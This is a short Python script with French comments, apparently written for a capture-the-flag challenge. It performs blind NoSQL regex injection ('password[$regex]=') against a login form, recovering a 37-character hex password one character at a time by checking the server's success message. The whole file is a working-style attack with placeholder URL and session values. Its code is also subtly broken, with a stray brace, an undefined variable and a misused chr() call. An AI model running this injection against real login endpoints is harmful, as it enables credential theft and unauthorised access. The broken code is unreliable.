import requests
import re
import string

cookies = dict(session='')

trouve = 0
l = 37 # Longueur du flag
final_pass = ""
alphabet = list(string.hexdigits[:16]) # Caractères possibles dans le flag
i = 0

while(trouve == 0):
    injection = "password[$regex]="+final_pass+alphabet[i]+".{"+str(l)+"}" # A modifier selon la structure du flag
    req = {'password':injection, 'nonce':''} # Ajouter le nonce permettant d'éviter le rejeu si nécessaire
    resultat = requests.post('', cookies=cookies},data=req).content # Requête comprenant l'injection
    regex = re.search("<center>Authentification valide. Le mot de passe est le flag.</center>",resultat) # Regex permettant de voir si le caractère essayé est le bon en testant le message de retour
    print(login)
    if regex is not None:
        if (l > 1):
	    final_pass += chr(alphabet[i])
	    l -= 1
	    i = 0 # On recommence l'alphabet à 0
	else:
	    final_pass += chr(alphabet[i])
	    trouve = 1 # Flag trouvé!
    else:
	i += 1 # On essaie le caractère suivant

print ("Le flag est : %s " % final_pass)
    
    
